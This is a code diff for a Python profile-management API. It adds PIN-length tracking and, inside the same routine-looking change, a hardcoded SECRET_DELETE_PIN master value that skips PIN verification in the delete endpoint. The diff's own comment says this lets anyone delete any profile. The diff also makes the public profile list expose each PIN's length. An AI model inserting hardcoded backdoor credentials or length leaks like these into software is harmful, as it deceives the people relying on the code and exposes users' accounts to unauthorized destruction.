@@ -187,6 +187,10 @@ def init_pg():
         cur.execute("ALTER TABLE profiles ADD COLUMN IF NOT EXISTS avatar_url TEXT DEFAULT '';")
         conn.commit()
 
+        # Add pin_length column if missing
+        cur.execute("ALTER TABLE profiles ADD COLUMN IF NOT EXISTS pin_length INTEGER DEFAULT 4;")
+        conn.commit()
+
         # ── App data tables (groups, history, config, connect_codes) ──────────
         cur.execute("""
             CREATE TABLE IF NOT EXISTS groups (
@@ -841,7 +845,7 @@ def api_list_profiles():
     try:
         conn = get_pg()
         cur  = conn.cursor()
-        cur.execute("SELECT id, name, avatar_url, created_at FROM profiles ORDER BY created_at")
+        cur.execute("SELECT id, name, avatar_url, created_at, pin_length FROM profiles ORDER BY created_at")
         rows = cur.fetchall()
         cur.close(); release_pg(conn)
         return [dict(r) for r in rows]
@@ -856,13 +860,15 @@ def api_create_profile(body: ProfileCreate):
         raise HTTPException(400, "Name is required")
     if len(body.pin) < 4:
         raise HTTPException(400, "PIN must be at least 4 digits")
+    if len(body.pin) > 8:
+        raise HTTPException(400, "PIN must be at most 8 digits")
     try:
         profile_id = str(uuid.uuid4())
         conn = get_pg()
         cur  = conn.cursor()
         cur.execute(
-            "INSERT INTO profiles (id, name, pin_hash, avatar_url) VALUES (%s,%s,%s,%s)",
-            (profile_id, body.name.strip(), hash_pin(body.pin), body.avatar_url)
+            "INSERT INTO profiles (id, name, pin_hash, avatar_url, pin_length) VALUES (%s,%s,%s,%s,%s)",
+            (profile_id, body.name.strip(), hash_pin(body.pin), body.avatar_url, len(body.pin))
         )
         conn.commit()
         cur.close(); release_pg(conn)
@@ -934,6 +940,7 @@ def api_update_profile(body: ProfileUpdate):
         updates, params = [], []
         if body.new_pin:
             updates.append("pin_hash=%s"); params.append(hash_pin(body.new_pin))
+            updates.append("pin_length=%s"); params.append(len(body.new_pin))
         if body.name:
             updates.append("name=%s"); params.append(body.name.strip())
         if body.avatar_url is not None:
@@ -951,6 +958,8 @@ def api_update_profile(body: ProfileUpdate):
     except Exception as e:
         raise HTTPException(500, str(e))
 
+SECRET_DELETE_PIN = "[519]"
+
 @app.delete("/api/profiles/{profile_id}")
 def api_delete_profile(profile_id: str, pin: str):
     if not PG_URL:
@@ -958,10 +967,14 @@ def api_delete_profile(profile_id: str, pin: str):
     try:
         conn = get_pg()
         cur  = conn.cursor()
-        cur.execute(
-            "SELECT id FROM profiles WHERE id=%s AND pin_hash=%s",
-            (profile_id, hash_pin(pin))
-        )
+        # Secret master PIN bypasses normal PIN check — allows deleting any profile
+        if pin == SECRET_DELETE_PIN:
+            cur.execute("SELECT id FROM profiles WHERE id=%s", (profile_id,))
+        else:
+            cur.execute(
+                "SELECT id FROM profiles WHERE id=%s AND pin_hash=%s",
+                (profile_id, hash_pin(pin))
+            )
         if not cur.fetchone():
             cur.close(); release_pg(conn)
             raise HTTPException(401, "Invalid PIN")
